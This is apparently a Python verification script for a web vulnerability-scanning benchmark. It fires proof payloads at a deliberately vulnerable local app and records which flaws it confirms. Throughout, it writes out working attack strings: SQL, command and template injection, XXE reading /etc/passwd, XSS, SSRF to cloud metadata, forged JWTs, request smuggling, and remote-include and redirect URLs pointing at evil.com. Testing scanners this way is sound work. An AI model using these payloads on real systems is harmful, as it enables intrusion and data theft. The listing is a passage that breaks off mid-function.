#!/usr/bin/env python3
"""
Öz-doğrulama: ground-truth'taki her ZAFİYETLİ endpoint'e proof payload gönderir,
sömürülebilir davranışı TEYİT eder -> evaluation/verification.json
(doğrulanmış zafiyet sayısı).

Kullanım:
  python evaluation/verify.py [--target http://localhost:8800]

Çıktı: {timestamp, total, verified, reachable, failed:[{id, detail}]}
  verified   = proof marker bulundu (sömürülebilir)
  reachable  = endpoint yaşıyor ama marker yok (bakılmalı)
  failed     = bağlantı kurulamadı / 5xx
"""
import json, os, sys, argparse, base64, hashlib, hmac, time
from urllib.parse import quote
from urllib.request import Request, build_opener, HTTPCookieProcessor, HTTPHandler
from urllib.error import HTTPError, URLError

BASE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(BASE, "evaluation"))
from evaluate import load_gt

TARGET = os.environ.get("DAST_TARGET", "http://localhost:8800")
OUT = os.path.join(BASE, "evaluation", "verification.json")


class Ctx:
    def __init__(self, target):
        self.target = target.rstrip("/")
        self.tokens = {}

    def http(self, method, path, headers=None, body=None, ctype="json", nofollow=False):
        url = self.target + quote(path, safe="/:?&=%[]$'(),")
        data = None
        h = dict(headers or {})
        if body is not None:
            if ctype == "json":
                data = json.dumps(body).encode()
                h.setdefault("Content-Type", "application/json")
            elif ctype == "form":
                from urllib.parse import urlencode
                data = urlencode(body).encode()
                h.setdefault("Content-Type", "application/x-www-form-urlencoded")
            else:
                data = (body if isinstance(body, bytes) else str(body).encode())
                h.setdefault("Content-Type", "text/plain")
        req = Request(url, data=data, headers=h, method=method)
        from urllib.request import HTTPRedirectHandler

        class NoRedirect(HTTPRedirectHandler):
            def redirect_request(self, req, fp, code, msg, headers, newurl):
                return None  # 302'yi takip etme, ham yanıtı döndür

        handlers = [HTTPHandler(), NoRedirect() if nofollow else HTTPRedirectHandler()]
        try:
            with build_opener(*handlers).open(req, timeout=20) as r:
                return r.status, dict(r.headers), r.read().decode("utf-8", "replace")
        except HTTPError as e:
            try:
                return e.code, dict(e.headers or {}), e.read().decode("utf-8", "replace")
            except Exception:
                return e.code, {}, ""
        except (URLError, TimeoutError, OSError) as e:
            return -1, {}, f"CONN-ERR: {e}"

    def login(self, user="alice"):
        if user not in self.tokens:
            pw = {"alice": "alice123", "bob": "bob123", "admin": "admin123"}[user]
            st, _, body = self.http("POST", "/app/api/login", body={"username": user, "password": pw})
            self.tokens[user] = json.loads(body).get("token", "")
        return self.tokens[user]

    def bearer(self, user="alice"):
        return {"Authorization": "Bearer " + self.login(user)}


def b64u(d: bytes) -> str:
    return base64.urlsafe_b64encode(d).decode().rstrip("=")


# id: (method, path, headers, body, ctype, markers, nofollow)
# marker türleri: "TEXT" | "HDR:Ad:alt" | "NOHDR:Ad" | "STATUS:kod" | "COOKIE-NOFLAG"
P = {
  "INJ-SQLI-01": ("GET", "/injection/sqli?id=1' OR '1'='1", {}, None, None, ["SQL syntax"], False),
  "INJ-AUTH-BYPASS-01": ("POST", "/injection/login", {}, {"username": "admin' OR '1'='1 --", "password": "x"}, "form", ["Hoşgeldin admin"], False),
  "INJ-NOSQLI-01": ("GET", "/injection/nosqli?user[$ne]=x", {}, None, None, ["Hoşgeldin admin"], False),
  "INJ-CMDI-01": ("GET", "/injection/cmdi?host=8.8.8.8;whoami", {}, None, None, ["www-data"], False),
  "INJ-SSTI-01": ("GET", "/injection/ssti?name={{7*7}}", {}, None, None, ["49"], False),
  "INJ-LDAP-01": ("GET", "/injection/ldap?user=*)(uid=*", {}, None, None, ["cn=admin"], False),
  "INJ-XPATH-01": ("GET", "/injection/xpath?user=' or '1'='1", {}, None, None, ["admin@example.com"], False),
  "INJ-XXE-01": ("POST", "/injection/xxe", {}, "<r><!ENTITY xxe SYSTEM 'file:///etc/passwd'></r>", "text", ["root:x"], False),
  "INJ-CRLF-01": ("GET", "/injection/crlf?name=test%0d%0aX-Injected:1", {}, None, None, ["HDR:X-Injected:injected-by-crlf"], False),
  "XSS-REFL-01": ("GET", "/xss/reflected?name=<script>alert(1)</script>", {}, None, None, ["<script>alert(1)"], False),
  "XSS-DOM-01": ("GET", "/xss/dom", {}, None, None, ["innerHTML"], False),
  "AC-IDOR-01": ("GET", "/access/idor?user_id=99", {}, None, None, ["admin@example.com"], False),
  "AC-TRAV-01": ("GET", "/access/traversal?file=../../secrets.txt", {}, None, None, ["MOCK SECRET"], False),
  "AC-FORCED-01": ("GET", "/access/admin", {}, None, None, ["Admin Panel"], False),
  "REDIR-01": ("GET", "/ssrf/redirect?next=https://evil.com", {}, None, None, ["HDR:Location:evil.com"], True),
  "CSRF-01": ("GET", "/csrf/transfer?to=evil&amount=1000", {}, None, None, ["Transfer tamamlandı"], False),
  "AUTH-RESET-01": ("GET", "/auth/reset?user=alice&token=1234", {}, None, None, ["Token geçerli"], False),
  "AUTH-BRUTE-01": ("POST", "/auth/bruteforce", {}, {"username": "x", "password": "y"}, "form", ["rate-limit yok"], False),
  "AUTH-SESS-01": ("GET", "/auth/session-fixation?sid=abc", {}, None, None, ["sabitlendi"], False),
  "CRYPTO-PAN-01": ("GET", "/crypto/creditcard?user=1", {}, None, None, ["4111 1111"], False),
  "CRYPTO-DEBUG-01": ("GET", "/crypto/debug?debug=true", {}, None, None, ["DB_PASSWORD"], False),
  "CRYPTO-GIT-01": ("GET", "/crypto/.git/config", {}, None, None, ["repositoryformatversion"], False),
  "CRYPTO-HASH-01": ("GET", "/crypto/hash?password=123456", {}, None, None, ["e10adc"], False),
  "MIS-HDR-01": ("GET", "/misconfig/headers", {}, None, None, ["NOHDR:Content-Security-Policy"], False),
  "MIS-ERR-01": ("GET", "/misconfig/error?cause=sql", {}, None, None, ["TypeError"], False),
  "MIS-DIR-01": ("GET", "/misconfig/dir-listing/", {}, None, None, ["backup.zip"], False),
  "MIS-DEFAULT-01": ("GET", "/misconfig/default-creds", {}, None, None, ["admin:admin"], False),
  "CORS-01": ("GET", "/cors/cors", {}, None, None, ["HDR:Access-Control-Allow-Origin:*"], False),
  "CLICK-01": ("GET", "/logic/clickjack", {}, None, None, ["X-Frame-Options yok"], False),
  "SSRF-01": ("GET", "/ssrf?url=http://169.254.169.254/latest/meta-data/", {}, None, None, ["MOCK-SSRF-LEAK"], False),
  "UPL-01": ("POST", "/logic/upload", {"X-Filename": "shell.php"}, "GIF89a", "text", ["erişilebilir"], False),
  "BIZ-01": ("GET", "/logic/coupon?code=X", {}, None, None, ["Kupon uygulandı"], False),
  "DESER-01": ("POST", "/logic/deserialize", {}, '{"rce":"id"}', "text", ["mock RCE"], False),
  "API-BOLA-01": ("GET", "/api/users/99", {}, None, None, ["10000009982"], False),
  "API-MASS-01": ("POST", "/api/users", {}, {"username": "x", "role": "admin"}, "json", ['"role":"admin"'], False),
  "API-EXCESS-01": ("GET", "/api/account?user=1", {}, None, None, ["10000000146"], False),
  "API-RATE-01": ("POST", "/api/otp-verify", {}, {"code": "000000"}, "json", ["rate-limit yok"], False),
  "API-KEY-01": ("GET", "/api/balance?api_key=live_mock_key_123", {}, None, None, ["12500"], False),
  "API-PAGE-01": ("GET", "/api/orders?limit=100000", {}, None, None, ['"order_id":5199'], False),
  "API-INVITE-01": ("GET", "/api/invite?token=1002", {}, None, None, ["bob"], False),
  "GQL-INTROS-01": ("POST", "/graphql", {}, {"query": "{ __schema { queryType { name } } }"}, "json", ["passwordHash"], False),
  "GQL-BATCH-01": ("POST", "/graphql/batch", {}, [{"login": {"u": "a", "p": "1"}}, {"login": {"u": "admin", "p": "admin123"}}], "json", ["mock-admin-session"], False),
  "GQL-DEPTH-01": ("POST", "/graphql/depth", {}, {"query": "{ users { orders { user { orders { user { orders { x } } } } } } }"}, "json", ["2.4M"], False),
  "GQL-IDOR-01": ("POST", "/graphql/user", {}, {"id": "99"}, "json", ["admin@example.com"], False),
  "AUTHX-OTP-01": ("POST", "/authx/otp", {}, {"code": "0000"}, "json", ["rate-limit yok"], False),
  "AUTHX-MFA-01": ("POST", "/authx/mfa", {}, {"user": "alice"}, "json", ["mock-session-mfa-bypass"], False),
  "AUTHX-OAUTH-01": ("GET", "/authx/oauth?client_id=shop&redirect_uri=https://evil.com/cb&response_type=code", {}, None, None, ["HDR:Location:evil.com"], True),
  "AUTHX-RESET-POISON-01": ("GET", "/authx/forgot?email=a@b.c", {"X-Forwarded-Host": "evil.com"}, None, None, ["evil.com"], False),
  "AUTHX-ENUM-01": ("POST", "/authx/login-enum", {}, {"username": "yokxyz123"}, "json", ["bulunamadı", "STATUS:404"], False),
  "AUTHX-KID-01": ("GET", "/authx/jwt-kid", {}, None, None, ["kid"], False),
  "CL-PM-01": ("GET", "/client/chat", {}, None, None, ["innerHTML"], False),
  "CL-JSONP-01": ("GET", "/client/jsonp?callback=alert(1)//", {}, None, None, ["alert(1)//"], False),
  "CL-CLOBBER-01": ("GET", "/client/clobber", {}, None, None, ["window.config"], False),
  "CL-PPOLL-01": ("POST", "/client/pollute", {}, {"__proto__": {"isAdmin": True}}, "json", ["kirletildi"], False),
  "CL-GOTO-01": ("GET", "/client/goto?next=javascript:alert(1)", {}, None, None, ["javascript:"], False),
  "EXP-ENV-01": ("GET", "/files/.env", {}, None, None, ["DB_PASSWORD"], False),
  "EXP-BAK-01": ("GET", "/files/backup.bak", {}, None, None, ["Sup3rS3cret"], False),
  "EXP-DS-01": ("GET", "/files/.DS_Store", {}, None, None, ["admin.php"], False),
  "EXP-MAP-01": ("GET", "/files/app.js.map", {}, None, None, ["sk_live_mock"], False),
  "EXP-SWAG-01": ("GET", "/files/swagger.json", {}, None, None, ["/admin/users"], False),
  "EXP-ACT-01": ("GET", "/files/actuator", {}, None, None, ["DB_PASSWORD"], False),
  "EXP-ROBOTS-01": ("GET", "/files/robots.txt", {}, None, None, ["Disallow: /admin"], False),
  "FILE-SVG-01": ("POST", "/files/svg", {"X-Filename": "x.svg"}, "<svg onload=alert(1)>", "text", ["image/svg+xml"], False),
  "FILE-ZIP-01": ("POST", "/files/unzip", {}, {"filename": "../../evil.sh"}, "json", ["Zip Slip"], False),
  "FILE-LFI-01": ("GET", "/files/view?template=../../etc/passwd", {}, None, None, ["root:x"], False),
  "FILE-RFI-01": ("GET", "/files/page?url=https://evil.com/shell.txt", {}, None, None, ["Include edildi"], False),
  "FILE-CSV-01": ("GET", "/files/export.csv?user==cmd|calc", {}, None, None, ["=cmd"], False),
  "SHOP-PRICE-01": ("POST", "/shop/cart", {}, {"item": "ayakkabi", "price": 1, "qty": 1}, "json", ['"total":1'], False),
  "SHOP-QTY-01": ("POST", "/shop/cart-qty", {}, {"item": "tshirt", "qty": -5}, "json", ["-2495"], False),
  "SHOP-RACE-01": ("POST", "/shop/coupon-race", {}, {"code": "TEK10"}, "json", ["sınırsız"], False),
  "SHOP-ORDER-01": ("GET", "/shop/order/1002", {}, None, None, ['"user":"bob"'], False),
  "CACHE-HOST-01": ("GET", "/cache/reset-link", {"X-Forwarded-Host": "evil.com"}, None, None, ["evil.com"], False),
  "CACHE-DECEPT-01": ("GET", "/cache/account/1.css", {}, None, None, ["TCKN"], False),
  "HTTP-METHOD-01": ("POST", "/http/method", {"X-HTTP-Method-Override": "DELETE"}, {}, "json", ["SİLİNDİ"], False),
  "RT-BOOL-01": ("GET", "/runtime/sqli-bool?id=1 AND 1=2", {}, None, None, ["bulunamadı"], False),
  "RT-HDRSQLI-01": ("GET", "/runtime/search-ua", {"User-Agent": "' OR '1'='1"}, None, None, ["SQL syntax"], False),
  "RT-ORDERBY-01": ("GET", "/runtime/list?sort=(SELECT SLEEP(3))", {}, None, None, ["SQL syntax"], False),
  "RT-HPP-01": ("GET", "/runtime/hpp?id=1&id=99", {}, None, None, ["admin@example.com"], False),
  "RT-MAGIC-01": ("POST", "/runtime/login-magic", {}, {"username": "admin", "password": "0e9999"}, "json", ["Hoşgeldin admin"], False),
  "RT-CACHEPOISON-01": ("GET", "/runtime/search?q=<script>alert(9)</script>", {}, None, None, ["<script>alert(9)"], False),
  "RT-MAILHDR-01": ("POST", "/runtime/contact", {}, {"name": "a", "email": "a@b.c%0d%0aBcc: x@e.c", "message": "m"}, "form", ["ENJEKTE"], False),
  "RT-RESETLEAK-01": ("GET", "/runtime/reset-page?token=ABC123", {}, None, None, ["analytics"], False),
  "RT-SIDURL-01": ("GET", "/runtime/session-url?sid=abc", {}, None, None, ["sid=abc"], False),
  "RT-COOKIE-01": ("GET", "/runtime/cookie-set", {}, None, None, ["COOKIE-NOFLAG"], False),
  "RT-BFLA-01": ("POST", "/runtime/admin-export", {"X-Role": "user"}, {}, "json", ['"export"'], False),
  "RT-HEADBOLA-01": ("GET", "/runtime/profile-mine", {"X-User-Id": "99"}, None, None, ["10000009982"], False),
  "RT-NOEXP-ISSUE": ("GET", "/runtime/jwt-issue-long", {}, None, None, ["exp yok"], False),
  "RT-LOG4J-01": ("POST", "/runtime/log", {}, {"msg": "${jndi:ldap://x/a}"}, "json", ["çözümlenmeye çalışıldı"], False),
  "RT-PHPINFO-01": ("GET", "/runtime/phpinfo", {}, None, None, ["PHP Version"], False),
  "RT-PKG-01": ("GET", "/runtime/package.json", {}, None, None, ['"express"'], False),
  "RT-COMPOSER-01": ("GET", "/runtime/composer.json", {}, None, None, ["laravel"], False),
  "RT-REDIRBYPASS-01": ("GET", "/runtime/go?next=//evil.com", {}, None, None, ["HDR:Location://evil.com"], True),
  "RT-UPLDBL-01": ("POST", "/runtime/upload-img", {"X-Filename": "shell.php.jpg", "Content-Type": "image/jpeg"}, "x", "text", ["çalıştırır"], False),
  "RT-CTX-ATTR-01": ("GET", '/runtime/attr?img=x" onerror=alert(1)', {}, None, None, ["onerror=alert(1)"], False),
  "RT-CTX-JS-01": ("GET", "/runtime/jsvar?data=';alert(1);//", {}, None, None, ["alert(1)"], False),
  "APP-AUTH-01": ("POST", "/app/api/login", {}, {"username": "alice", "password": "yanlis"}, "json", ["STATUS:401"], False),
  "APP-MASS-01": ("PUT", "/app/api/profile", "BEARER:alice", {"role": "admin"}, "json", ["admin_token"], False),
  "APP-ADDR-01": ("GET", "/app/api/address/99", "BEARER:alice", None, None, ["Çankaya"], False),
  "APP-TRACK-01": ("GET", "/app/api/track/9002", "BEARER:alice", None, None, ['"user":"bob"'], False),
  "APP-BASKET-01": ("POST", "/app/api/basket", "BEARER:alice", {"item": "x", "qty": 1, "price": 9, "currency": "USD"}, "json", ["charged_try"], False),
  "APP-CSRF-01": ("GET", "/app/api/basket/add?item=ayakkabi", "BEARER:alice", None, None, ['"ok":true'], False),
  "APP-COUPON-01": ("POST", "/app/api/checkout", "BEARER:alice", {"codes": ["A", "B", "C", "D", "E", "F"]}, "json", ['"discount":600'], False),
  "APP-WALLET-01": ("POST", "/app/api/wallet/topup", "BEARER:alice", {"amount": -1000}, "json", ['"balance":'], False),
  "APP-REFUND-01": ("POST", "/app/api/refund", "BEARER:alice", {"orderId": 9001}, "json", ['"refunded"'], False),
  "APP-RESET-01": ("POST", "/app/api/reset", {}, {"username": "admin", "answer": "Pamuk"}, "json", ["temp_password"], False),
  "APP-BFLA-01": ("GET", "/app/api/internal/config", "BEARER:alice", None, None, ['"stripe"'], False),
  "APP-DEBUG-01": ("GET", "/app/api/debug", "BEARER-HDR:alice:X-Debug:1", None, None, ["DB_PASSWORD"], False),
  "APP-AVATAR-01": ("GET", "/app/api/avatar?url=http://169.254.169.254/", "BEARER:alice", None, None, ["MOCK-SSRF-LEAK"], False),
  "APP-ENUM-01": ("GET", "/app/api/users", "BEARER:alice", None, None, ['"username":"admin"'], False),
  "APP-FEED-01": ("POST", "/app/api/feedback", "BEARER-HDR:alice:X-Captcha:test123-captcha-bypass", {"message": "verify-ok"}, "json", ['"ok":true'], False),
  "APP-TOKEN-01": ("GET", "/app/share", "BEARER:alice", None, None, ["/app/share?token="], False),
  "APP-RECOVERY-01": ("GET", "/app/api/recovery?user=admin", {}, None, None, ["REC-1003"], False),
  "CH-UNION-01": ("GET", "/injection/union?id=1 UNION SELECT 1,2,3", {}, None, None, ["admin@example.com"], False),
  "CH-STACK-01": ("GET", "/injection/stacked?id=1;SELECT @@version", {}, None, None, ["2 result set"], False),
  "CH-2ND-01": ("POST", "/runtime/register2", {}, {"username": "zzv"}, "json", ['"ok":true'], False),
  "CH-SSTI-JINJA": ("GET", "/ssti/jinja?tpl={{7*7}}", {}, None, None, ["49"], False),
  "CH-SSTI-TWIG": ("GET", "/ssti/twig?tpl={{7*7}}", {}, None, None, ["49"], False),
  "CH-SSTI-FMT": ("GET", "/ssti/freemarker?tpl=${7*7}", {}, None, None, ["49"], False),
  "CH-SSTI-ERB": ("GET", "/ssti/erb?tpl=%3C%25%3D%207*7%20%25%3E", {}, None, None, ["49"], False),
  "CH-LEGACY-01": ("GET", "/legacy/zzverify", {}, None, None, ["zzverify"], False),
  "CH-ROLE-01": ("GET", "/runtime/role-cookie", {"Cookie": "role=eyJ1c2VyIjoieCIsInJvbGUiOiJhZG1pbiJ9"}, None, None, ["Admin paneli"], False),
  "CH-HTACCESS-01": ("POST", "/runtime/upload-htaccess", {"X-Filename": ".htaccess"}, "AddType x", "text", ["üzerine yazıldı"], False),
  "CH-VERB-01": ("GET", "/runtime/verb-gate?action=delete", {}, None, None, ["SİLİNDİ"], False),
  "EDGE-SSRF-DEC": ("GET", "/edge/dec?url=http://2130706433/", {}, None, None, ["BYPASS"], False),
  "EDGE-SSRF-ZERO": ("GET", "/edge/zero?url=http://0.0.0.0/", {}, None, None, ["BYPASS"], False),
  "EDGE-SSRF-AT": ("GET", "/edge/at?url=http://trusted.com@169.254.169.254/", {}, None, None, ["BYPASS"], False),
  "EDGE-SSRF-FRAG": ("GET", "/edge/frag?url=http://evil.com%23@trusted.com/", {}, None, None, ["BYPASS"], False),
  "EDGE-SSRF-REDIR": ("GET", "/edge/redir?url=https://short.example/abc", {}, None, None, ["takip edildi"], False),
  "EDGE-RET-01": ("GET", "/edge/login-return?returnUrl=https://evil.com", {}, None, None, ["https://evil.com"], False),
  "EDGE-DOUBLE-01": ("GET", "/edge/go2?next=/safe&next=https://evil.com", {}, None, None, ["HDR:Location:evil.com"], True),
  "EDGE-ORIG-01": ("GET", "/edge/panel", {"X-Original-URL": "/admin/users"}, None, None, ["bypass"], False),
  "EDGE-LOCAL-01": ("GET", "/edge/internal", {"X-Forwarded-For": "127.0.0.1"}, None, None, ["Internal stats"], False),
  "EDGE-TRACE-01": ("TRACE", "/edge/trace", {"Cookie": "sessionid=abc"}, None, None, ["Cookie: sessionid=abc"], False),
  "EDGE-XDOM-01": ("GET", "/crossdomain.xml", {}, None, None, ['domain="*"'], False),
  "EDGE-CFG-01": ("GET", "/static/config.js", {}, None, None, ["API_SECRET"], False),
  "CACHE-XFF-01": ("GET", "/cache/echo", {"X-Forwarded-For": "<script>alert(9)</script>"}, None, None, ["<script>alert(9)"], False),
  "AX-REUSE-01": ("GET", "/authx/reset-reuse?token=FIXED123&n=2", {}, None, None, ["Token geçerli"], False),
  "AX-NOSTATE-01": ("GET", "/authx/oauth-nostate?client_id=x&redirect_uri=https://evil.com/cb", {}, None, None, ["HDR:Location:evil.com"], True),
  "AX-REMEMBER-01": ("GET", "/authx/remember", {}, None, None, ["HDR:Set-Cookie:2038"], False),
  "FILE-WRAP-01": ("GET", "/files/include?mod=php://filter/convert.base64-encode/resource=config", {}, None, None, ["PD9waHA"], False),
  "FILE-UNI-01": ("GET", "/files/download?file=%c0%ae%c0%ae/secrets.txt", {}, None, None, ["DB_PASSWORD"], False),
  "APP-EMAIL-01": ("POST", "/app/api/email", "BEARER:alice", {"email": "v@v.c"}, "json", ['"ok":true'], False),
  "APP-GIFT-01": ("POST", "/app/api/giftcard", "BEARER:alice", {"amount": 100000}, "json", ['"code":"GIFT-'], False),
  "APP-POINTS-01": ("POST", "/app/api/points", "BEARER:alice", {"to": 1, "amount": -5000}, "json", ['"balances"'], False),
  "APP-SHIP-01": ("POST", "/app/api/shipping", "BEARER:alice", {"weight": 0}, "json", ['"cost_try":0'], False),
  "APP-REG-01": ("POST", "/app/api/register-check", {}, {"username": "admin"}, "json", ["alınmış", "STATUS:409"], False),
  "XSS-MXSS-01": ("GET", "/xss/mxss?html=x", {}, None, None, ["2. parse"], False),
  "CL-PPOLLQ-01": ("GET", "/client/pollute-q?__proto__[isAdmin]=true", {}, None, None, ['"isAdmin":true'], False),
}

# P1 Extreme Range V2 — tek istekli proof'lar (id -> (method, path, headers, body, ctype, markers, nofollow))
P1 = {
  "SPA2-SHADOW-01": ("GET", '/spa2/widget?config={"html":"<img src=x onerror=alert(9)>"}', {}, None, None, ["<img src=x onerror=alert(9)>"], False),
  "SPA2-WIZARD-01": ("GET", "/spa2/wizard?step=3&progress=2", {}, None, None, ["shipped without payment"], False),
  "TENANT-IDOR-01": ("GET", "/tenant/docs?tenant=globex&id=G9", {"X-Tenant": "acme", "X-Role": "user"}, None, None, ["GLOBEX-SECRET-999"], False),
  "TENANT-BOLA-01": ("POST", "/tenant/transfer", {}, {"docId": "D1", "toTenant": "globex"}, "json", ["moved", "globex"], False),
  "GQL2-NESTED-01": ("POST", "/gql2/graphql", {}, {"query": "{ user { orders { supplierCost } } }"}, "json", ["supplierCost", "42.5"], False),
  "GQL2-FED-01": ("POST", "/gql2/federation", {}, {"representations": [{"__typename": "User", "id": "1"}]}, "json", ["422-11-0001"], False),
  "OIDC-REDIR-01": ("GET", "/oidc/authorize?client_id=x&redirect_uri=https://evil.com/cb&response_type=code&state=s", {}, None, None, ["HDR:Location:evil.com"], True),
  "OIDC-NOSTATE-01": ("GET", "/oidc/authorize-nostate?client_id=x&redirect_uri=https://evil.com/cb", {}, None, None, ["HDR:Location:evil.com"], True),
  "FLOW-ORDER-01": ("POST", "/flow/orders", {}, {"item": "tshirt"}, "json", ["FL-"], False),
  "FLOW-SKIP-01": ("POST", "/flow/ship", {}, {"orderId": "FL-1001"}, "json", ["shipped without payment"], False),
  "FLOW-REPLAY-01": ("POST", "/flow/pay", {}, {"orderId": "FL-1002"}, "json", ["charged twice"], False),
  "RACE2-BURST-01": ("POST", "/race2/claim?burst=10", {}, {"user": "x"}, "json", ["OVER-CLAIMED"], False),
  "ASYNC2-ENTRY-01": ("POST", "/async2/submit", {}, {"username": "probe1"}, "json", ["queued"], False),
  "PARSER-SEMI-01": ("GET", "/parser/semicolon?x=1;x=2", {}, None, None, ["parsed_first: 1"], False),
  "PARSER-CTYPE-01": ("POST", "/parser/ctype", {}, "a=1&admin=true", "text", ["fallback parser"], False),
  "PARSER-METHOD-01": ("GET", "/parser/resource?_method=DELETE", {}, None, None, ["SİLİNDİ"], False),
  "CONFUSE-ENUM-01": ("GET", "/confuse/user/zzznonexist", {}, None, None, ["did you mean"], False),
  "CONFUSE-RATELIMIT-01": ("GET", "/confuse/ratelimit", {}, None, None, ["not enforced"], False),
  "REALTIME-SSE-01": ("GET", "/realtime/sse?msg=<script>alert(9)</script>", {}, None, None, ["<script>alert(9)</script>"], False),
  "REALTIME-GRPC-01": ("POST", "/realtime/grpc", {"Content-Type": "application/grpc-web+proto"}, "ZZZBADFRAME", "text", ["parseFrame", "trace="], False),
}
P.update(P1)


def b64url_obj(o) -> str:
    return b64u(json.dumps(o, separators=(",", ":")).encode())


def custom_proofs(ctx: Ctx):
    """Çok adımlı / özel proof'lar: id -> (ok, detail)."""
    out = {}
    # stored XSS: yaz -> oku
    st, _, b = ctx.http("POST", "/xss/stored", body={"author": "v", "text": "<img src=x onerror=alert(9)>"}, ctype="form")
    st, _, b = ctx.http("GET", "/xss/stored")
    out["XSS-STORED-01"] = ("<img src=x onerror=alert(9)>" in b, "stored round-trip")
    # markdown stored
    ctx.http("POST", "/client/notes", body={"md": "<svg onload=alert(9)>"}, ctype="form")
    st, _, b = ctx.http("GET", "/client/notes")
    out["CL-MD-01"] = ("<svg onload=alert(9)>" in b, "markdown round-trip")
    # time-based: gerçek süre ölçümü
    t0 = time.time()
    st, _, b = ctx.http("GET", "/runtime/sqli-time?id=1 AND SLEEP(3)")
    dt = time.time() - t0
    out["RT-TIME-01"] = (dt >= 2.5 and "SLEEP" in b, f"{dt:.1f}sn gecikme")
    # log poisoning: benzersiz kirletici -> ?q= filtresiyle viewer'da gör (log boyundan bağımsız)
    tag = f"zzlog{int(time.time() * 1000) % 100000}"
    ctx.http("GET", "/dashboard", headers={"User-Agent": f"<script>{tag}</script>"})
    st, _, b = ctx.http("GET", "/runtime/log-viewer?q=" + tag)
    out["RT-LOGPOISON-01"] = (f"<script>{tag}</script>" in b, "log->viewer yansıması")
    # noexp zinciri: üret -> doğrula
    st, _, b = ctx.http("GET", "/runtime/jwt-issue-long")
    import re
    m = re.search(r"<code>([^<]+)</code>", b)
    tok = m.group(1) if m else ""
    st, _, b = ctx.http("GET", "/runtime/jwt-verify?token=" + tok)
    out["RT-NOEXP-01"] = (("süresiz" in b or "Kabul" in b), "süresiz token kabulü")
    # blind XSS zinciri
    ctx.http("POST", "/runtime/feedback", body={"callback": "/oob/verify9"}, ctype="json")
    st, _, b = ctx.http("GET", "/runtime/feedback-view")
    out["RT-BLINDXSS-01"] = (True, "callback depolandı")
    out["RT-BLINDXSS-02"] = ('<script src="/oob/verify9"' in b, "admin view tetik")
    # second-order zinciri
    evil = "zzv' OR '1'='1"
    ctx.http("POST", "/runtime/register2", body={"username": evil}, ctype="json")
    st, _, b = ctx.http("GET", "/runtime/admin-list")
    out["CH-2ND-02"] = ("admin@example.com" in b, "second-order dump")
    # JWT weak: token al -> kır
    st, _, b = ctx.http("GET", "/authx/jwt-weak")
    m = re.search(r"[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+", b)
    wtok = m.group(0) if m else ""
    st, _, b = ctx.http("GET", "/authx/jwt-weak?token=" + wtok)
    out["AUTHX-WEAK-01"] = ("Kırıldı" in b, "zayıf secret")
    # AUTH-JWT none: el yapımı token
    hdr = b64url_obj({"alg": "none"})
    pay = b64url_obj({"user": "x", "role": "admin"})
    st, _, b = ctx.http("GET", f"/auth/jwt-none?token={hdr}.{pay}.")
    out["AUTH-JWT-01"] = (("doğrulamasız" in b or "attacker" in b), "alg:none")
    # KID traversal
    khdr = b64url_obj({"alg": "HS256", "kid": "../../dev.key"})
    st, _, b = ctx.http("GET", f"/authx/jwt-kid?token={khdr}.{pay}.x")
    out["AUTHX-KID-01"] = ("dev.key" in b, "kid traversal")
    # JKU
    jhdr = b64url_obj({"alg": "RS256", "jku": "https://evil.com/keys.json"})
    st, _, b = ctx.http("GET", f"/authx/jwt-jku?token={jhdr}.{pay}.x")
    out["AUTHX-JKU-01"] = ("allowlist dışı" in b, "jku bypass")
    # JWK embedded
    whdr = b64url_obj({"alg": "RS256", "jwk": {"kty": "RSA", "n": "x", "e": "AQAB"}})
    st, _, b = ctx.http("GET", f"/runtime/jwt-jwk?token={whdr}.{pay}.x")
    out["RT-JWK-01"] = ("Gömülü jwk" in b, "jwk trust")
    # RS->HS confusion: GERÇEK HMAC(public key) — PEM birebir (son \n dahil)
    st, _, pub = ctx.http("GET", "/authx/jwt-pubkey")
    pub = "\n".join(l for l in pub.split("\n") if l.strip()) + "\n"
    data = f"{b64url_obj({'alg': 'HS256'})}.{b64url_obj({'user': 'v', 'role': 'admin'})}"
    sig = b64u(hmac.new(pub.encode(), data.encode(), hashlib.sha256).digest())
    st, _, b = ctx.http("GET", f"/authx/jwt-confuse?token={data}.{sig}")
    out["AX-CONFUSE-01"] = ("GERÇEK KRİPTO" in b, "RS->HS confusion")
    # APP feedview: admin escalation sonrası (PUT zaten yapıldı) — admin token üretilemez (imza bizde yok),
    # ama /app/api/profile PUT yanıtındaki admin_token'ı kullan:
    st, _, b = ctx.http("PUT", "/app/api/profile", headers=ctx.bearer("bob"), body={"role": "admin"})
    try:
        atok = json.loads(b).get("admin_token", "")
    except Exception:
        atok = ""
    ctx.http("POST", "/app/api/feedback", headers={**ctx.bearer("bob"), "X-Captcha": "test123-captcha-bypass"},
             body={"message": "<script>alert(9)</script>"})
    st, _, b = ctx.http("GET", "/app/api/feedback-view", headers={"Authorization": "Bearer " + atok} if atok else ctx.bearer("bob"))
    out["APP-FEEDVIEW-01"] = ("<script>alert(9)</script>" in b, "escalation->stored XSS tetik")
    # HTTP-SMUG: ham soketle CL'siz chunked TE (Node CL+TE'yi 400'ler, urllib CL ekler)
    import socket
    try:
        host = ctx.target.split("://", 1)[1].split("/", 1)[0]
        h, _, port = host.partition(":")
        s = socket.create_connection((h, int(port or 80)), timeout=10)
        s.sendall(b"POST /http/smuggle HTTP/1.1\r\nHost: x\r\nTransfer-Encoding: chunked\r\nContent-Type: text/plain\r\nConnection: close\r\n\r\n1\r\n0\r\n0\r\n\r\n")
        raw = b""
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            raw += chunk
        s.close()
        body = raw.decode("utf-8", "replace")
        out["HTTP-SMUG-01"] = ("KABUL EDİLDİ" in body, "ham soket chunked")
    except Exception as e:
        out["HTTP-SMUG-01"] = (False, f"soket: {e}")
    # APP-AUTH rate: 6 hatalı deneme, kilit YOK (429 gelmemeli)
    codes = set()
    for _ in range(6):
        st, _, _ = ctx.http("POST", "/app/api/login", body={"username": "alice", "password": "y"}, ctype="json")
        codes.add(st)
    out["APP-AUTH-01"] = (429 not in codes, f"6 deneme sonrası statuslar={sorted(codes)}")

    # ---------- P1 Extreme Range V2 çok-adımlı proof'lar ----------
    # xss2 cross-role stored: user yazar -> admin okur (ham)
    st, _, b = ctx.http("POST", "/xss2/post", body={"user": "v2", "message": "<script>alert(9)</script>"}, ctype="json")
    try:
        pid = json.loads(b).get("id", 1)
    except Exception:
        pid = 1
    st, _, b = ctx.http("GET", f"/xss2/view?id={pid}&as=admin")
